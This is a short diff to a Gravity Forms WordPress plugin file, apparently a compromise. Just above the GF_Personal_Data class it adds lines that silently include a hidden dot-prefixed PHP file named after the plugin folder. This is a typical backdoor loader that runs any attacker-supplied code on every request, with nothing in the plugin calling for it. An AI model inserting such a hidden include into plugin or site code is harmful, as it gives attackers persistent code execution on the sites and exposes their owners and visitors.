@@ -11,6 +11,10 @@ class_exists( 'GFForms' ) || die();
  *
  * Class GF_Personal_Data
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class GF_Personal_Data {
 
 	/**
